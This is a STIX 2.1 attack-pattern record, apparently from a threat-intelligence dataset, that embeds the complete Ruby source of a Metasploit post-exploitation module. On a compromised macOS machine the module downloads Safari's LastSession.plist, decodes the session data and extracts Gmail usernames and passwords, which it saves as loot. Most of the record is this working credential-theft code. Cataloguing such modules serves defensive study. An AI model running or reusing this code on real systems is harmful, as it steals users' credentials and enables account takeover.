{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d747b678-2f18-4f89-8c56-cadcfe078eb2",
    "created": "2024-08-14T16:33:00.696616Z",
    "modified": "2024-08-14T16:33:00.69662Z",
    "name": "OSX Gather Safari LastSession.plist",
    "description": " This module downloads the LastSession.plist file from the target machine. LastSession.plist is used by Safari to track active websites in the current session and sometimes contains sensitive information such as usernames and passwords.  This module will first download the original LastSession.plist, and then attempt to find the credential for Gmail. The Gmail's last session state may contain the user's credential if his/her first login attempt failed (likely due to a typo) and then the page got refreshed or another login attempt was made. This also means the stolen credential might contain typos.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/osx/gather/safari_lastsession.rb",
            "external_id": "safari_lastsession.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.securelist.com/en/blog/8168/Loophole_in_Safari"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'OSX Gather Safari LastSession.plist',\n        'Description' => %q{\n          This module downloads the LastSession.plist file from the target machine.\n          LastSession.plist is used by Safari to track active websites in the current session,\n          and sometimes contains sensitive information such as usernames and passwords.\n\n          This module will first download the original LastSession.plist, and then attempt\n          to find the credential for Gmail. The Gmail's last session state may contain the\n          user's credential if his/her first login attempt failed (likely due to a typo),\n          and then the page got refreshed or another login attempt was made. This also means\n          the stolen credential might contain typos.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'sinn3r'],\n        'Platform' => [ 'osx' ],\n        'SessionTypes' => [ 'meterpreter', 'shell' ],\n        'References' => [\n          ['URL', 'http://www.securelist.com/en/blog/8168/Loophole_in_Safari']\n        ]\n      )\n    )\n  end\n\n  #\n  # Returns the Safari version based on version.plist\n  # @return [String] The Safari version. If not found, returns ''\n  #\n  def get_safari_version\n    vprint_status(\"#{peer} - Checking Safari version.\")\n    version = ''\n\n    f = read_file('/Applications/Safari.app/Contents/version.plist')\n    xml = begin\n      REXML::Document.new(f)\n    rescue StandardError\n      nil\n    end\n    return version if xml.nil?\n\n    xml.elements['plist/dict'].each_element do |e|\n      if e.text == 'CFBundleShortVersionString'\n        version = e.next_element.text\n        break\n      end\n    end\n\n    version\n  end\n\n  #\n  # Converts LastSession.plist to xml, and then read it\n  # @param filename [String] The path to LastSession.plist\n  # @return [String] Returns the XML version of LastSession.plist\n  #\n  def plutil(filename)\n    cmd_exec(\"plutil -convert xml1 #{filename}\")\n    read_file(filename)\n  end\n\n  #\n  # Returns the XML version of LastSession.plist (text file)\n  # Just a wrapper for plutil\n  #\n  def get_lastsession\n    print_status(\"#{peer} - Looking for LastSession.plist\")\n    plutil(\"#{expand_path('~')}/Library/Safari/LastSession.plist\")\n  end\n\n  #\n  # Returns the <array> element that contains session data\n  # @param lastsession [String] XML data\n  # @return [REXML::Element] The Array element for the session data\n  #\n  def get_sessions(lastsession)\n    session_dict = nil\n\n    xml = begin\n      REXML::Document.new(lastsession)\n    rescue StandardError\n      nil\n    end\n    return nil if xml.nil?\n\n    xml.elements['plist'].each_element do |e|\n      found = false\n      e.elements.each do |e2|\n        next unless e2.text == 'SessionWindows'\n\n        session_dict = e.elements['array']\n        found = true\n        break\n      end\n\n      break if found\n    end\n\n    session_dict\n  end\n\n  #\n  # Returns the <dict> session element\n  # @param xml [REXML::Element] The array element for the session data\n  # @param domain [Regexp] The domain to search for\n  # @return [REXML::Element] The <dict> element for the session data\n  #\n  def get_session_element(xml, domain_regx)\n    dict = nil\n\n    found = false\n    xml.each_element do |e|\n      e.elements['array/dict'].each_element do |e2|\n        next unless e2.text =~ domain_regx\n\n        dict = e\n        found = true\n        break\n      end\n\n      break if found\n    end\n\n    dict\n  end\n\n  #\n  # Extracts Gmail username/password\n  # @param xml [REXML::Element] The array element for the session data\n  # @return [Array] [0] is the domain, [1] is the user, [2] is the pass\n  #\n  def find_gmail_cred(xml)\n    vprint_status(\"#{peer} - Looking for username/password for Gmail.\")\n    gmail_dict = get_session_element(xml, /(mail|accounts)\\.google\\.com/)\n    return '' if gmail_dict.nil?\n\n    raw_data = gmail_dict.elements['array/dict/data'].text\n    decoded_data = Rex::Text.decode_base64(raw_data)\n    cred = decoded_data.scan(/Email=(.+)&Passwd=(.+)&signIn/).flatten\n    user, pass = cred.map { |data| Rex::Text.uri_decode(data) }\n\n    return '' if user.blank? || pass.blank?\n\n    ['mail.google.com', user, pass]\n  end\n\n  #\n  # Runs the module\n  #\n  def run\n    cred_tbl = Rex::Text::Table.new({\n      'Header' => 'Credentials',\n      'Indent' => 1,\n      'Columns' => ['Domain', 'Username', 'Password']\n    })\n\n    #\n    # Downloads LastSession.plist in XML format\n    #\n    lastsession = get_lastsession\n    if lastsession.blank?\n      print_error(\"#{peer} - LastSession.plist not found\")\n      return\n    else\n      p = store_loot('osx.lastsession.plist', 'text/plain', session, lastsession, 'LastSession.plist.xml')\n      print_good(\"#{peer} - LastSession.plist stored in: #{p}\")\n    end\n\n#\n# If this is an unpatched version, we try to extract creds\n#\n=begin\n    version = get_safari_version\n    if version.blank?\n      print_warning(\"Unable to determine Safari version, will try to extract creds anyway\")\n    elsif version >= \"6.1\"\n      print_status(\"#{peer} - This machine no longer stores session data in plain text\")\n      return\n    else\n      vprint_status(\"#{peer} - Safari version: #{version}\")\n    end\n=end\n\n    #\n    # Attempts to convert the XML file to an actual XML object, with the <array> element\n    # holding our session data\n    #\n    lastsession_xml = get_sessions(lastsession)\n    unless lastsession_xml\n      print_error('Cannot read XML file, or unable to find any session data')\n      return\n    end\n\n    #\n    # Look for credential in the session data.\n    # I don't know who else stores their user/pass in the session data, but I accept pull requests.\n    # Already looked at hotmail, yahoo, and twitter\n    #\n    gmail_cred = find_gmail_cred(lastsession_xml)\n    cred_tbl << gmail_cred unless gmail_cred.blank?\n\n    unless cred_tbl.rows.empty?\n      p = store_loot('osx.lastsession.creds', 'text/plain', session, cred_tbl.to_csv, 'LastSession_creds.txt')\n      print_good(\"#{peer} - Found credential saved in: #{p}\")\n      print_line\n      print_line(cred_tbl.to_s)\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'osx' ]"
    ]
}